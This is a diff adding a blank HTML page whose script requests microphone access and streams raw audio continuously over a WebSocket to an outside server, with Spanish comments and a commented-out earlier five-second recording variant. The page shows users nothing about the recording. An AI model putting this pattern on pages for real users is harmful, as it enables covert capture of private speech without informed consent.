@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+				<meta charset="utf-8">
+				<meta name="viewport" content="width=device-width, initial-scale=1.0">
+				<title></title>
+</head>
+<body>
+	<script>
+
+		const socket = new WebSocket('wss://wss.workos.cloud:7000/audio');
+
+		/*
+navigator.mediaDevices.getUserMedia({ audio: true })
+  .then((stream) => {
+    const audioContext = new AudioContext();
+    const mediaRecorder = new MediaRecorder(stream);
+
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = (event) => {
+      chunks.push(event.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const audioBlob = new Blob(chunks, { type: 'audio/wav' });
+      const fileReader = new FileReader();
+
+      fileReader.onload = () => {
+        const arrayBuffer = fileReader.result;
+        socket.send(arrayBuffer); // Enviar el ArrayBuffer a través de WebSockets
+      };
+
+      fileReader.readAsArrayBuffer(audioBlob);
+    };
+
+    // Iniciar la grabación de audio
+    mediaRecorder.start();
+
+    // Detener la grabación después de cierto tiempo (ejemplo: 5 segundos)
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 5000);
+  })
+  .catch((error) => {
+    console.error('Error al acceder al micrófono:', error);
+  });
+*/
+
+		navigator.mediaDevices.getUserMedia({ audio: true })
+  .then((stream) => {
+    const audioContext = new AudioContext();
+    const mediaStreamSource = audioContext.createMediaStreamSource(stream);
+    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+
+    scriptProcessor.onaudioprocess = (event) => {
+      const audioData = event.inputBuffer.getChannelData(0);
+      socket.send(audioData.buffer); // Enviar el ArrayBuffer de los datos de audio a través de WebSockets
+    };
+
+    // Conectar el ScriptProcessor a la fuente de audio
+    mediaStreamSource.connect(scriptProcessor);
+    scriptProcessor.connect(audioContext.destination);
+
+    // Detener la grabación y cerrar la conexión WebSocket al finalizar
+    mediaStreamSource.onended = () => {
+      scriptProcessor.disconnect();
+      socket.close();
+    };
+  })
+  .catch((error) => {
+    console.error('Error al acceder al micrófono:', error);
+  });
+	</script>
+</body>
+</html>
